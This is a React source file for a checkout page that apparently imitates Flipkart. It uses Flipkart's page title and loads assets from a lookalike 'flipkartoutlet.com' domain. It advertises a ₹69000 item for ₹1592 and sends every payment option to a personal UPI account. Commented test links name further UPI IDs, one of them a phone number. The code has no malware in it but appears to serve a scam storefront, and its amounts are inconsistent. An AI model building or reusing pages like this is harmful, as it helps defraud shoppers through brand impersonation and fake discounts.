import React from 'react'
import { Helmet } from 'react-helmet'
import { Link, useNavigate } from 'react-router-dom'
import { FaArrowLeftLong } from "react-icons/fa6";
import { Button } from 'reactstrap';


const PaymentDetails = () => {


    const navigate = useNavigate();

    {/* <a href="upi://pay?pa=upiaddress@okhdfcbank&pn=JohnDoe&cu=INR">Buy Now</a><br /> working

<a href="upi://pay?pa=UPIID@oksbi&amp;pn=JOHN BRITAS AK &amp;cu=INR" class="upi-pay1"> 2 Pay Now !</a><br />

<a href="upi://pay?pa=UPIID@oksbi&amp;pn=FNAME SNAME K&amp;cu=INR" class="upi-pay1">3 Pay Now !</a><br />

<a href="tez://upi/pay?pa=UPIID@oksbi&amp;pn=FNAME SNAME K&amp;cu=INR" class="upi-pay1">Google pay Now !</a><br /> working

<a href="tez://upi/pay?pa=8269522681@ybl&amp;pn=FNAME SNAME K &amp;am=399 &amp;cu=INR" class="upi-pay1">Google pay Now 2 !</a><br /> working


<a href="phonepe://pay?pa=UPIID@oksbi&amp;pn=FNAME SNAME K&amp;cu=INR" class="upi-pay1">Phone Now !</a><br /> not working

<a href="phonepe://pay?pa=upiaddress@okhdfcbank&pn=JohnDoe&cu=INR" class="upi-pay1">Phone 1 Now !</a><br /> working


<a href="phonepe://pay?pa=8269522681@ybl&pn=JohnDoe&am=399&cu=INR" class="upi-pay1">Phone 2 Now !</a><br /> working

<a href="phonepe://pay?pa=8269522681@ybl&pn= shiv raj &am=399&cu=INR" class="upi-pay1">Phone 3 Now !</a><br /> working */}

    return (
        <>

            <Helmet>
                <meta charSet="utf-8" />
                <title>Online Shopping Site for Mobiles, Electronics, Furniture, Grocery, Lifestyle, Books & More. Best Offers!</title>
            </Helmet>
            <div className="payment-detail">
                <div className="container-fluid p-3 header-container">
                    <div className="row header align-items-center">
                        <div className="col-1">
                            <Button onClick={() => navigate(-1)} className='back-arrow' ><FaArrowLeftLong /></Button>
                        </div>
                        <div className="col-10 ms-4 ms-sm-0">
                            <div className="menu-logo">
                                <h4 className="mb-0 mt-1 ms-2">Payments</h4>
                            </div>
                        </div>
                    </div>
                </div>

                <div class="container-fluid">
                    <form method="post">
                        <div class="payment-type mt-3 card p-md-5 px-3">
                            <div class="card card-click mt-3">
                                <div class="g-pay w-100 box">
                                    <a href="upi://pay?pa=Gettdeelshub@sbi&pn=Kuldeep&am=1&cu=INR">
                                        <label> <input type="radio" name="radioGroup" value="gpay" className='payment-input' /> <img
                                            src="https://flipkartoutlet.com/assets/front/flipkart/img/gpay_icon.svg" alt=""
                                            width="30px" /> Google Pay</label>
                                    </a>
                                </div>
                            </div>
                            <div class="card card-click mt-3">
                                <div class="g-pay w-100 box">
                                    <a href="upi://pay?pa=Gettdeelshub@sbi&pn=Kuldeep&am=1&cu=INR">
                                        <label> <input type="radio" name="radioGroup" value="phonepe" className='payment-input' /> <img
                                            src="https://flipkartoutlet.com/assets/front/flipkart/img/phonepe.svg" alt=""
                                            width="30px" /> Phone Pay</label>
                                    </a>
                                </div>
                            </div>
                            <div class="card card-click mt-3">
                                <div class="g-pay w-100 box">
                                    <a href="upi://pay?pa=Gettdeelshub@sbi&pn=Kuldeep&am=1&cu=INR">
                                        <label><input type="radio" name="radioGroup" value="paytm" className='payment-input' /> <img
                                            src="https://flipkartoutlet.com/assets/front/flipkart/img/paytm_icon.svg" alt=""
                                            width="30px" /> Paytm</label>
                                    </a>
                                </div>
                            </div>
                            <div class="card card-click mt-3">
                                <div class="g-pay w-100 box">
                                    <a href="upi://pay?pa=Gettdeelshub@sbi&pn=Kuldeep&am=1&cu=INR">
                                        <label> <input type="radio" name="radioGroup" value="bhim_upi" className='payment-input' /> <img
                                            src="https://flipkartoutlet.com/assets/front/flipkart/img/bhim_upi.svg" alt=""
                                            width="30px" /> BHIM UPI</label>
                                    </a>
                                </div>
                            </div>
                            <div class="card card-click mt-3 mb-3">
                                <div class="g-pay w-100 box">
                                    <a href="upi://pay?pa=Gettdeelshub@sbi&pn=Kuldeep&am=1&cu=INR">
                                        <label><input type="radio" name="radioGroup" value="whatspp_pay" className='payment-input' /> <img
                                            src="https://flipkartoutlet.com/assets/front/flipkart/img/whatspp_pay.svg" alt=""
                                            width="30px" /> WhatsApp Pay</label>
                                    </a>
                                </div>
                            </div>
                        </div>

                        <div class="card mt-3 p-3 mb-3" id="price-detail">
                            <h3>Price Details</h3>
                            <div class="price-detail-div mt-2">
                                <div class="my-3 d-flex justify-content-between">
                                    <span class="title">Price (1 item)</span>
                                    <span class="text-success">₹ 1592</span>
                                </div>
                                <div class="my-3 d-flex justify-content-between">
                                    <span class="title">Discount</span>
                                    <span class="data discount-amt text-success">-₹ 0</span>
                                </div>
                                <div class="my-3 d-flex justify-content-between">
                                    <span class="title">Delivery Charges</span>
                                    <span class="data text-success">FREE Delivery </span>
                                </div>
                                <div class="my-3 pt-3 d-flex justify-content-between total">
                                    <span class="title">Total Amount </span>
                                    <span class="data selling_price">₹ 1592</span>
                                </div>
                                <div class="product-price-list mt-3 pt-3 saved-div">
                                    <span class="text-success">You will save <span class="discount-amt">-₹1592</span> on this
                                        order</span>
                                </div>
                            </div>
                        </div>
                    </form>
                </div>


                <div class="container-fluid foot-summary mb-3" >
                    <div className="card">
                        <div class="row p-2">
                            <div class="col">
                                <del>₹69000</del>
                                <br />
                                <span class="data selling_price"> ₹1592</span>
                            </div>
                            <div class="col">
                                <form action="https://flipkartoutlet.com/Payment" method="post">
                                    <input type="hidden" name="slug" id="slug" />
                                    <input type="hidden" name="address" id="address" value="Array" />
                                    <button type="submit" class="btn bg-warning" >Continue</button>
                                </form>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </>
    )
}

export default PaymentDetails
